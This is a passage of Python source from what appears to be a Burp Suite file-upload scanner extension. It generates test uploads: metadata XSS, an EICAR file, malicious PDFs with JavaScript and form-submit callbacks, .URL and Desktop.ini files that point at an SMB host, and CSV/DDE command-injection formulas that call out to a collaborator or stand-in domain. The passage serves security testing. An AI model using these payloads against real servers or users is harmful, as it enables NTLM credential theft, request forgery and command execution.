        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._xss_payload):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "BfXss" + name
            title = "Cross-site scripting (stored)" # via " + ext[1:].upper() + " Metadata"
            desc = 'XSS through injection of HTML in Metadata of type ' + name + '. The server ' \
                    'reflected the code ' + cgi.escape(
                payload) + ' inside the uploaded file and used a content-type that ' \
                    'works for XSS, meaning that HTML injection is possible.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect, check_xss=True))
            self.sender.simple(injector, Constants.HTML_TYPES, basename, content, redownload=True)
        return []

    def _eicar(self, injector):
        # it would be easy to add GTUBE (spam detection test file), but there seems to be too little benefit for that
        # https://en.wikipedia.org/wiki/GTUBE
        # Additionally, it is hard to test if "illegal" content such as adult content can be uploaded as
        # there is no test file for that.
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Eicar"
        content_eicar = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDK" + "Td9JEVJQ0FSLVNUQU5EQVJEL" + "UFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
        content_eicar = content_eicar.decode("base64")
        title = "Malicious Eicar upload/download"
        desc = 'The eicar antivirus test file was uploaded and downloaded. That probably means there is no antivirus' \
               'installed on the server. That reduces the attack surface (attackers can not attack the antivirus ' \
               'software) but if any uploaded files are ever executed, then malware is not detected. You should try ' \
               'to upload an executable (e.g. with the recrusive uploader module of the UploadScanner).'
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_eicar))
        self.sender.simple(injector, Constants.EICAR_TYPES, basename, content_eicar, redownload=True)
        return []

    def _pdf(self, injector, burp_colab):

        # TODO: Check if this should be implemented: http://michaeldaw.org/backdooring-pdf-files

        colab_tests = []

        if injector.opts.file_formats['pdf'].isSelected():
            #A boring PDF with some JavaScript
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "PdfJavascript"
            content = '%PDF-1.0\n%\xbf\xf7\xa2\xfe\n%QDF-1.0\n\n%% Original object ID: 1 0\n1 0 obj\n<<\n  /AA <<\n    ' \
                      '/WC <<\n      /JS (app.alert\\("http://www.corkami.com \\(Closing\\)"\\);)\n      /S /\n    >>\n' \
                      '  >>\n  /OpenAction <<\n    /JS (app.alert\\("http://www.corkami.com \\(Open Action\\)"\\);)\n  ' \
                      '  /S /JavaScript\n  >>\n  /Pages 2 0 R\n>>\nendobj\n\n%% Original object ID: 2 0\n2 0 obj\n<<\n ' \
                      ' /Count 1\n  /Kids [\n    3 0 R\n  ]\n>>\nendobj\n\n%% Page 1\n%% Original object ID: 3 0\n3 0 ' \
                      'obj\n<<\n  /AA <<\n    /O <<\n      /JS (app.alert\\("http://www.corkami.com \\(Additional Action' \
                      '\\)"\\);)\n      /S /JavaScript\n    >>\n  >>\n  /Parent 2 0 R\n>>\nendobj\n\nxref\n0 4\n0000000000 ' \
                      '65535 f \n0000000052 00000 n \n0000000328 00000 n \n0000000422 00000 n \ntrailer <<\n  /Root 1 0 ' \
                      'R\n  /Size 4\n  /ID [<a35f6bb80bdac8e3c95c298f6177b175><a35f6bb80bdac8e3c95c298f6177b175>]\n>>\n' \
                      'startxref\n585\n%%EOF\n'
            title = "Malicious PDF with JavaScript upload/download"
            desc = 'A PDF file was uploaded and downloaded that has JavaScript content. The PDF pops JavaScript alerts.' \
                    'This only proofs that PDFs can be uploaded, that have active content. If a user executes the JavaScript code after downloading, ' \
                    'malicious code could potentially be executed. You should also try uploading a bad PDF, which will probably work as well. Bad PDF is described' \
                   'here: https://github.com/deepzec/Bad-Pdf and https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/ . Although they ' \
                   'claim that it works in any PDF reader, it did not work in IE\'s built-in PDF reader, but it did work in Adobe Reader.<br><br>' \
                   'The file that was uploaded here is from Ange Albertini and located at https://github.com/corkami/pocs/blob/master/pdf/javascript.pdf'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename, content, redownload=True)

            # Burp community edition doesn't have Burp collaborator
            if not burp_colab:
                return colab_tests

            # Bad PDF with Collaborator payload according to https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
            content = '''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
	   /O <<
	      /F (\\\\\\\\test.example.org\\\\test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>
	   >>
	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
	/Root 1 0 R
>>
%%EOF
'''
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "BadPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "Bad PDF interaction"
            base_detail = 'The payload was the bad PDF as described here: https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py . ' \
                          "Usually you will be able to steal NTLM credentials and similar request forgery scenarios. "
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Colaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                     "burp colaborator URL. This means that Server Side Request Forgery might be possible " \
                     "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                     "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.PDF_TYPES, basename + "Colab", content, issue_colab,
                               replace="test.example.org", redownload=True))

            content = '''% a pdf file where javascript code is evaluated for execution

% BSD Licence, Ange Albertini, 2011

%PDF-1.4
1 0 obj
<<>>
%endobj

trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("'''+Constants.MARKER_COLLAB_URL+'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>'''
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "JsOpenDocPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "PDF JavaScript openDoc interaction"
            base_detail = 'The payload was a PDF JavaScript with app.openDoc, similar to the one here: ' \
                          'https://github.com/corkami/pocs/blob/master/pdf/js-eval.pdf .'
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Colaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                           "burp colaborator URL. This means that Server Side Request Forgery might be possible " \
                           "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                           "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.PDF_TYPES, basename + "Colab", content, issue_colab,
                                                       redownload=True))

            content = '''% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by InsertScript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>

<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="{}test"/>
            </event>

</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>'''.format(Constants.MARKER_COLLAB_URL)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "FormSubmitPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "PDF form submit interaction"
            base_detail = 'The payload was an auto submit PDF form, similar to the one here: ' \
                          'https://insert-script.blogspot.ch/2018/05/adobe-reader-pdf-client-side-request.html .'
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Collaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                           "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                           "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                           "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.PDF_TYPES, basename + "Colab", content, issue_colab,
                                                       redownload=True))

        return colab_tests

    def _ssrf(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests

        # shortcut.url files for Windows
        content = '[InternetShortcut]\r\n' \
                  'URL=http://test.example.org/\r\n' \
                  'WorkingDirectory=\\\\test.example.org\SMBShare\r\n' \
                  'ShowCommand=7\r\n' \
                  'Modified=20F06BA06D07BD014D\r\n' \
                  'HotKey=1601'
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "UrlInternetShortcut"
        title_download = "Malicious URL file upload/download"
        title_colab = "URL file interaction"
        base_detail = 'The payload was a Windows .URL shortcut file, similar to the one here: ' \
                      'https://insert-script.blogspot.ch/2018/05/dll-hijacking-via-url-files.html .'
        detail_download = 'A .URL file was uploaded and downloaded that includes a payload. A user who downloades ' \
                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
                          'supplied SMB server. <br><br> {} <br>'.format(base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading an .URL file with a pointer to an external " \
                       "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                       "or that a user downloaded the file and opened it in on Windows. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
        issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
        self.sender.simple(injector, Constants.URL_TYPES, basename + "Mal", content, redownload=True)
        colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.URL_TYPES, basename + "Colab", content, issue_colab,
                                                   redownload=True, replace="test.example.org"))

        # The same with Desktop.ini
        content = '[.ShellClassInfo]\r\n' \
                  'IconResource=\\\\test.example.org\\\r\n'
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "DesktopIni"
        title_download = "Malicious Desktop.ini file upload/download"
        title_colab = "URL file interaction"
        base_detail = 'The payload was a Windows Desktop.ini file, similar to the one here: ' \
                      'https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ .'
        detail_download = 'A .ini file was uploaded and downloaded that includes a payload. A user who downloads ' \
                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
                          'supplied SMB server. <br><br> {} <br>'.format(base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading an .ini file with a pointer to an external " \
                       "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                       "or that a user downloaded the file and opened it in on Windows. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
        issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
        self.sender.simple(injector, Constants.INI_TYPES, "Desktop", content, redownload=True, randomize=False)
        colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.INI_TYPES, "Desktop", content, issue_colab,
                                                   redownload=True, replace="test.example.org", randomize=False))

        return colab_tests

    def _csv_spreadsheet(self, injector, burp_colab):
        colab_tests = []

        if injector.opts.file_formats['csv'].isSelected():
            title_download = "Malicious CSV upload/download"
            desc_download = 'A CSV with the content {} was uploaded and downloaded. When this spreadsheet is opened in {}, ' \
                            'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
                            'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
            title_colab = "Malicious CSV Collaborator Interaction"
            desc_colab = 'A CSV with the content {} was uploaded and lead to command execution. When this spreadsheet is opened in {}, ' \
                         'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
                         'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
            software_payload = (("Excel", "=cmd|' /C {} {}'!A0"), ("OpenOffice", '=DDE("cmd";"/C {} {}";"__DdeLink_60_870516294")'))
            for software_name, payload in software_payload:
                basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Csv" + software_name
                formula = payload.format("nslookup", "unknown.domain.example.org")
                issue = self._create_issue_template(injector.get_brr(), title_download, desc_download.format(formula, software_name), "Tentative", "Low")
                # Do simple upload/download based
                self.dl_matchers.add(DownloadMatcher(issue, filecontent=formula))
                self.sender.simple(injector, Constants.CSV_TYPES, basename + "Mal", formula, redownload=True)
                # TODO: Decide if additional sleep based payloads would make sense, probably rather not
                if burp_colab:
                    # Also do collaborator based:
                    for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
                        formula = payload.format(cmd, server)
                        desc = desc_colab + "<br>In this case we actually detected that interactions took place when using a {} command," \
                                "meaning the server executed the payload or someone opened it in the {} spreadsheet software. <br>" \
                                "The payload was {} . <br>" \
                                "Interactions: <br><br>".format(cmd_name, software_name, formula)
                        issue = self._create_issue_template(injector.get_brr(), title_colab, desc, "Firm", "High")
                        file_contents = []
                        file_contents.append(formula)
                        # Detect if original uploaded file was CSV, how many columns, etc., then start injecting CSV
                        # specific payloads such as the formulas above, but *only* if we detect an uploaded CSV
                        insertion_points = InsertionPointProviderForActiveScan(injector).get_csv_insertion_points(injector)
                        for insertion_point in insertion_points:
                            # Inject the formula into each field
                            _, _, content = insertion_point.create_request(formula)
                            file_contents.append(content)
                            # Injecting a collaborator URL with http:// and https:// etc. would be possible here
                            # but as we already pass this as an insertion point for active scan we don't do this here
                        for index, content in enumerate(file_contents):
                            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.CSV_TYPES, basename + "Colab" + str(index),
                                                                        content, issue, replace=replace, redownload=True))

        if injector.opts.file_formats['xlsx'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Excel"
            content_excel = 'eJztXQk8lNvfPzPGGFuWZC2mspWxr10hSUrIUilClkER7ljaiKJFi6JVud26bpcWktJKom5SlEjlqlvaQ2mn5TbvOc8YM/PMGLzL//O+/3d+Ps8zz/Ob' \
                             'c77f3znnd9Y5z6PhpsKjA8fV2wBO7IEY+MGUBGQuHQEepuwbeQC/ZzLRJfvTBB5MkfyfEkkKLEiyOFCcUi9RC4iATAGgDX6WkKrgGYDH8JgP4gAJgMR' \
                             '4OoP6r5LJmA3BBGTDReh4dvCKAPKgVgGoYZYpYufh2PkYFq4cO9vBbzCZEadi0+u3c4mTsHCbsfMY7DwMIMTTWJy/MI0p0AT34ScFbEWuTgRjJAhOIB' \
                             'hEg4UgBDDg+X9bCMkBQhCAAygnCg9hMUAI1BYMxEIZAIMIVAZMi8KAISYOGEJJSIjxIBJ+Z9UXQhYXggrc4DkCRIIEDI9GIMDQwtJFGjAEypuBQgBYA' \
                             'gOlS2rAEpDsl0WTRAXiQAO6/VSG0Zj51LG0sWNNbHtv5htit5okHdjSU3Fh/L3pYQH4gLpAAozmDWhkgseDGk2SAXQLXf6QAlCx4E6whOwBCKL2fjee' \
                             'FSWIasul6o3AqxxjOAZTTAqiapKMwDj4B2G44/NGxMWYAWhgKj8xNEogN58egjk4cOCsgAHqJYPwOHwAuJiPoPci+cSkcvW5FzG9OFv/UaT/79AjIQC' \
                             'ufCbiwp/s1ZP29qM/1o8+sx/9nn70v/ajP9yP/ugQ7dnZj/7IEPGHGv6/y57j/ejPYnpyP+H59WX96E/3oz/Rj/5CP3qWPRJs/XYFhUqtSi12eilc+l' \
                             '3Su6Q5+TCOpe/pxen1T0m+8Kz8lGLrb8MmHhxXZYeXBoL9XIbPTrZfGQjklR2oXPIUFJSllaU5/iwpEGcYH04Rppfrx055Tro8AUjrS5cCjx4os/WKH' \
                             'D1VoB6HP5wTfgG8VOe0DzSB9ovDvkiQXqkf/BF95RUezir309RkihJIpgAusQfWPbrtKRRDkMKjR0KEea8E51ysWRa7hxgGLSHyRyAMNQJxqBHEhhqB' \
                             'NNQI4kONQB5qBImhRqAMNYLkUCNIDTWC9FAjyAw1guxQIwwbagS5gSI44iKg1kCs/wgk7At6OHI59gCMH0RhcCDiQkEUBwdCFgoyfHAgEkJBlAYHQhE' \
                             'KMmJwIJJCQZQHA1LnJrx0VAYHIrx0VAcHIrx01AYHIrx01AcHIrx0NAYHIrx0Rg4GxMxceOmMGhyI8NLRHByI8NLRGhyI8NKhDg5EeOmMHhyI8NIZww' \
                             'MCBIOwOtP+QcYODkR46WgPDkR46egMDkR46egODkR46egNDoS3dLJxIPqYrQgEjZccHByYfCDoi/fv3zPZIBJcgdlLlxQBOkkuHZtOSoCO36hxPEZ9T' \
                             'QGDNyo1NZXPKG6dJJcObxS3jr9LHw8G6NLxqTDAZW2S4FQw63L/B1MxG2cUDaCq1m8qJATURgqXjm0Af/YY9mUP24gBRjxGgO2+KAKc2wnOnitdN5gc' \
                             '98WzGg9UKHhWEx7WPN9+WJkdecz+K41pX8n22y5iIMw6vpItLS3lK1lunSSXDl+y3Dr+rDAbalaY82YFIPeTFTXCCsCCh1UMx0rgZ7UE3K0WPgKRIsA' \
                             'B+UGsBgPCdBAOYj0YEPywAZ9+G6HpF5DrE3hyna9tY/sEM40gJNd/Gqis8RFshxphIuCuztDt8NUZXyfsAHedAHgGtjcdPHjwf6wj2UYcDudRcK5mZk' \
                             'LVoRpSHaOW02MSTHMoM0EOl60EkiZzGKwuJnCQpAMPQ3g4giiwHNBBDPZDCCohApxWSpDo4Q86upni6JqARWbqoNQgJgU+JjN+pjFCmcw4TOL08O9P7' \
                             'whmUuRjMudn0hXKZM5hItPDX79+LZhpOB+TBT/TeKFMFhwmCXo4832dYCYlPiZLfiYjoUyWHCYKPbyl7b1gphF8TFb8TGZCmaw4TJL08MddfwlmUkZM' \
                             'FgP4nhZkshiU79W5Vdx9I5hJhY9JgO+NFcrE7Xt1bj3XiwQzqfIxCfA9PaFM3L5X59ba2iqYSY2PSYDvGQhl4va9Ojfm81zBTOp8TAJ8z1goE7fv1bm' \
                             'dvPJCMJMGH5MA3zMXysTte3VuVx6dFMw0EjFZDeB7VMhkNSjfMzPfW/1cMNMoPiYBvqctlInb98zMP5ZkCGbS5GMS4Hv6Qpm4fc/MvLa2VjCTFh+TAN' \
                             '+jCWXi9j0zc2ZLuGAmKh+TAN8zEcrE7Xtm5lmH+qlPo/mYBPiehVAmbt8zMz/UkCWISQbO8OFst8/pHHEUo5gS/boZAP57m1mggLWPqg90LAfUjB90N' \
                             'A6U26MAeJ1iKhhUmwNqzg+qgwPldh7WyEUgqA4H1IIfdBwOlNtPINBFIBhUlwNqyQ9qiAPldgkApjAuCwbV44Ba8YOa4kC5Sx+AuCIXwaD6GGhifERw' \
                             'CD2HsowXlDgCA00E8SACTvFCIDQaJiJQcSZrBi/ee41GchgoGTouW0GAgbnvKDx3kjx324hyYBz6uWEynUEPjYxJjInIoaTi7FFmSoHJ0AoGPEJBJEx' \
                             'oIjwi+rUKDdB5rEIzW45VrDsKz50kz902OPQdn0Zm5lBovKaIk5nSYAo0YzlYCBZj21eowB/WxQDse5S1BihrnRfGCM5aJZi1zjBujMCsRcsKnKxN+q' \
                             '8mQhbQ0HKUMyOCHhKzMD6H4sNrjZgakwKtYUBb6NCWGGhXPEDTOL4WA9nArvksG9h3ZMgzAjZC8ognKvopgx4TRmdQZ9GXJuRQXHCpt2TKY3xRMN+eY' \
                             'sUZA8KwgqWCWfBzKfRgNIVh5wFKSK/PUoARmqS4JELYCbywBHWmGHCBPpHQ5/woMlqEYAOhlYpeIBIwThODJUvFlawYDDwDxMJSReXKLk0TVJoe9MQE' \
                             'RnA0X+0jjISl6QHtRtQMzBu4DUDrEWwD0KJFrwFSsDWF7Z1HbMLC5TmUMFwWScEoHtCMBFgYywFaHe2DY9Yx2b6AVhU4vsC6o/DcSfLcoWSbpYnDZGv' \
                             'jki0Ok+AJjY/ta0JYSZeFLSkM6BMaGQ3rJcx0J1zaNaDv+GDVMbq3WvJmP1qC6Es9IHOyH6QBaIc1Dg5gcAkwE5FLBEOLwvpcAdd5ycP2WBqA+yF0Rn' \
                             'xoJGNhOLTODufZcrCe3sfqFwP6NLIObTEL5/IvCehNU2YtwkAJ24iKsD2W5QGl8g/GxOSZsv3AUnv7SDw0kbuyiANEZIUn4h+LiSkIITITRsR0OFrX3' \
                             'ktkjSfiH4qJKQohMhdGxBptEjEiGzwRf58qNlwIkYXAUiGilmUCalnm0BlRMd/jwhPoVD96dDRsV2fjqo0qbFnmYNhR0IG+gzgMmQ6x/eA5GvNRdmJ4' \
                             'ugh2HUJrN2SsnvyURhJQT0iwnvjCRguZze59ABbeNk1CQEchAR2QNzxvRzEcTERjPd9gRgx3i4mrZURpONbzxapDzICtJZNTRUYAO5RvWGZRv8OCiWN' \
                             '8D6fH5FA24vBVYL5xcogKc45VQnHw+A7zEHFy91ACB1TcnT+Zp/Mn83T+ZJ7OnwyyKHPhwTFnK0A/hyvAxKGuERmEWoRl2JU7PMKgwyTC5tkMtlgLQR' \
                             'LWSnJCcO+KtQILsP3Sa2AuuKFlMWjHLNghw+ww3UNRBXu4M4HrM58iDw/AI5tgh2gKBynFBBIMQyAVE9BP9jIAhC4OE6MaO1FDg6NDx8IxzONUgJWHo' \
                             '8lYONlvx+7kgE9C2JTY0MTFcPzmEbyYrtK7n/sH80fvGlgVgQIP2EUlE2GWc8iZMBwFhFKU4cGxRrn3kwh2UqRkd3J9cySNCDxniJHQri+kHg1e/S1X' \
                             'iUhGElk/7vs7xcYkQDuCZi2Lo8cHGC1dHH00+7rHJRN55+5p39OfGbrmlU6i6LxaXZNV81vyxau52sq190oLZn/rdmucNbmQqhxNazHv3mf7hFGhJVF' \
                             '2aXdegeux95MNtDs0XAIOPrSe2VI0J3OVuurE4INyuz+eu1Cub70ubXrmHu+DK57HRbiV2mVtZWht/b3xqw3xumWSbto/acPqE73uq3ZkZts8qXW6+0' \
                             'zsVMmouXZvnn3Zrf1468lzDlYeR12dKOknLubc7iz8MrVWebLRtbN6n4x+N8g8UD+vetYXtZKXgXTLW5aFf1PfS29SvFQikxl0M4KqZvi80nZfZmfrn' \
                             'XnR5Q+ySrOSrQLrPKqYSgs+Obwc3lSX6p9KRO4rhsuvg3cKXlyEV1YE1oaWIAY9Ot7YCJ0zttxcdMlEZl3Xmor0WylejZdUdZKMD251Ms5PAW36qZFj' \
                             'NFo1Olpn1pClzlMyfu/qPmT3o3jjl7btL6jKew6TLz12crge2ZZkV5m6unbN7wU6FP+lcWvzV7SWBZV73sqfWG+qcXDaKZMdinLrW2aWexdPDrtVK9/' \
                             'o6txqEaKdWpD9c9Bdrd371B5ZuTV9Uva+a72geEthLfPEJZO6fTOrUo/RnjmTYqy3uy18GnKg0PiJT8XWQvrh25oNZWe+3PmHICihUct2KqfDqw2A9U' \
                             'N8QiR9Md2Y6+weHBMcQWcgD5Gpc5e6RJWf1JZyYMnWFuvQ8/rOIaXXi89/Bk556o41+xt/bb377Em69Y2HSs17Z8jOo+VJyG6g1xutP/02mVagUfjXt' \
                             'JF/0qLbakY8f7VUtfbk5uEPp1+N90oZ27x1TVHZA+qdMoPm0V20B4FntRfZbXTxfdnUPe6xc4eBrhTRRrDx1l81zVZLoB1trNrAZ7wpMrtzXv1GDRfl' \
                             'SuOnqZFfjTqO+Gul0/NnzuxUa51b6pRl6T09YF+7kdfsPcdN1i749XNpyVbZsyTG9dE0jWlU3V3fTcl7tb+5dB5pn7Nkx6zSCPKJsF1qVQ0BXyt8K5d' \
                             '3Na+YOds61mHjoSVrz1Jpr3qaNUY8vFS7vX5a6cueLXr53te7M6bUynjtfJRVeaW6MqVjW+X9KRJm1aafJ9krSBQ+cfE2krtGN10TrB1TouPx6PyEJ6' \
                             'Y5b6+pPFNzebHf+o9nfgcb9WvWa1/YtV/1tv3um7VK305bLVqnlKDnXbhq3LPQg0pdIREFs9fIR90quG/rdPLJJRnzJPuqm793eWlrJ996Z/D1pvHDc' \
                             '/OmSuTK71gRJns2+8f1p2arWha636xV0fvyu6M8eXNMcZBY4f0/ZfdeulKS3dEELH6pdvUx+uNGyd03stUyUWmNLuveOMZ7HvNb6pSasi7eepaW9DHH' \
                             'Qz8WSDiof6raoByY7p18Jl1udXiR1tylsq7vNo9KPtE4iuQOAyno1L4adk7Rqv2f+kXxV/NuOemVjyLnhxv6BO6nqr9/6e1TN29M959+m/aZ2RPTiN7' \
                             'a0x/XflK8eUvp8ekt+hPaLtuO2UghxmYq6i44431k0/jEnmP2q1Y2KjtKqKo1blAxUbB12rBF7488Gr2mUtovRez9508d1sapyz+8f2F9LLBi2Zdj0T' \
                             'FF13Jsp9RWb//25Hwl89te4/KHqd8/bzFmZntUbFbR/fHAgfn1za6ghwWac+bvfvza16H826t1p4OYr093VSZEdjESQqr1tK9Un99ys8KFtlb8p54nw' \
                             '1dOyJyesV5n1ZiG155227PFyyun3l7TEdyaMdMmTE3l7Y32Q38mjny3Qzsrt8v5uPjE8E2fVZeoP9q353rJ27AdtPvbPuzIXJHRkBv1xt6VJiHnO2Pa' \
                             'scsHS7WCNz532qCYqWxT1ejz8LjPplFHvuXJXy+uCbuWuyD+VYpHueYYj21uVzNHTFvTMDqzyjhKxTGujL73iV7gFq+7hyV66qZWn5p023Hl6kP0K7a' \
                             'ROl6d3hMcTS1lV2aEPR0zIfDDoUwNKcl9gQuulbfJSLflLLsYXLG2qctx7c/n/9ldHKpRqzMh8dXEyZtyrxJsX7voB54rCc2ZovvZ52ep0RvK17mde1' \
                             'RT9/fo9lHf03Iq3qycXPLsjZze6pqt891dndMKY+fcb7tuu3veO9vApgnVxbSmZ8d3BJzPs8nPP+0390BKhqnzi8i1x7t7fCTSNf39rIynPdxMPTIyx' \
                             'HfBA+eko4e7SdKdry6EWztrKgSv6VQ1vqdpX9NRdPnE1Ombeuzru6s6/qhf5/ks79BHwi/79lz8RlJ3WK9S4KVJaQgmdQcWyY0Nazb6ZHT/3bnnO5lG' \
                             'pTULguzLIucvCFotc+GkjHaSz/OKU7nURe6epDqSY3qb62lqyNlKea/E2RuL8hjxK5qUY9KuXG1fEpKTXPKlZdGKaqZH65N7DK2Ctp8NTnnf0fH/JWX' \
                             'cs7gjVS3rvmlFR5Ejd0y87Dk9Kf5Oom/8g+YeZndA/YWK5AfXOztsileoaS3f1BGoazvvi02F260LkyLyPWwbfTRTng/vsnufO9y1huH+LruhwJ648l' \
                             'bdVJPCpx8d9W5sAbsUJh42kxg+94y4i9+VJ24rp4ZZZDUoZq09fMG7VD63fc3bnW4XM7M1k9rnLD23YUsLze7V0TnNh8L95onn/LlUp66mbbvrHy+nn' \
                             'rCpuN4cdUo65dq50fvDjJ2qd9fpei3ZGhlD3pH9MddItd5x8rHO/JJI27knt3/dfCRpLii7b/B2W2u6VvsoB5lJpIxHJsP++pD73qe9ffOSMnOHPwq6' \
                             '1Zo2gMjj1gqeS88VnXkTsM8vQH2RytuTztUU670ZpzbFvJ1Ccsg48XJWvsqBn+cFnZbe5fdx+7iPyfJ+4pvDO1Joxe1RW1tvyFqYmou7l3/Ieli4Tt7' \
